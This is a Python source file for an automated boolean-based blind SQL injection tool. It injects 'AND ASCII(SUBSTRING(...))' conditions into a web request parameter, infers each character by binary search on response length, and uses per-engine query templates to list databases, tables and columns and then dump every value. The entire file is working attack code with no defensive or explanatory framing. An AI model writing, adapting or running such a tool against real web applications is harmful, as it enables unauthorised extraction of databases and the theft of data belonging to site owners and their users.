import requests


def ecart(a, b):
    if b == 0:
        return 100 if a != 0 else 0   
    x = abs(a-b) / b * 100
    return x
    
def send(url, params, method):
    if(method == "GET"):
        gurl =  requests.get(url.geturl(), params=params)
        return gurl
    else:
        purl = requests.post(url.geturl(), data=params)
        return purl

def bsearch_req(ctx, expression, mid, i):
    payload = f" AND ASCII(SUBSTRING({expression},{i},1))>{mid}"
    copy = ctx.params.copy()
    copy[ctx.name] = ctx.params[ctx.name][0] + payload
    copy_r = send(ctx.url, copy, ctx.method)
    if(copy_r.status_code == 200 and (ecart(ctx.len, len(copy_r.text)) < 10)):
        return 1
    return 0
    
def bsearch(ctx, expression, i):
    lo = 0
    hi = 255
    while(lo != hi):
        mid = (lo + hi) // 2
        if(bsearch_req(ctx,expression, mid, i) == 1):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract(ctx, expr):
    result = ""
    i = 1
    while True:
        c = bsearch(ctx, expr, i)
        if c == 0:
            break
        result += chr(c)
        i+= 1
    return result

def extract_columns(ctx, tables, engine):
    result = {}
    for t in tables:
        columns= []
        columns.append("")
        while True:
            seen = ",".join(f"'{c}'" for c in columns)
            chr = extract(ctx, engine["columns"].format(t=t, seen=seen))
            if(chr == ""):
                break
            columns.append(chr)
        columns.pop(0)
        result[t] = columns
    return result

def extract_tables(ctx, engine):
    tables=[]
    tables.append("")
    while True:
        seen = ",".join(f"'{t}'" for t in tables)
        c = extract(ctx, engine["tables"].format(seen=seen))
        if c == "":
            break
        tables.append(c)
    tables.pop(0)
    return tables

def extract_bases(ctx, engine):
    bases=[]
    bases.append("")
    while True:
        seen = ",".join(f"'{t}'" for t in bases)
        c = extract(ctx, engine["bases"].format(seen=seen))
        if c == "":
            break
        bases.append(c)
    bases.pop(0)
    return bases

def dump(ctx, table, columns, engine):
    result = {}
    for c in columns:
        values = [""]
        while True:
            seen = ",".join(f"'{v}'" for v in values)
            v = extract(ctx,engine["value"].format(c=c, t=table, seen=seen))
            if v == "":
                break
            values.append(v)
        result[c] = values[1:]
    return result

def dump_db(ctx, engine):
    data={}
    bases = extract_bases(ctx, engine)
    tables= extract_tables(ctx, engine)
    columns = extract_columns(ctx, tables, engine)
    for t, c in columns.items():
        data[t] = dump(ctx, t, c, engine)
    final_dump = {"bases": bases,"data": data}
    return final_dump
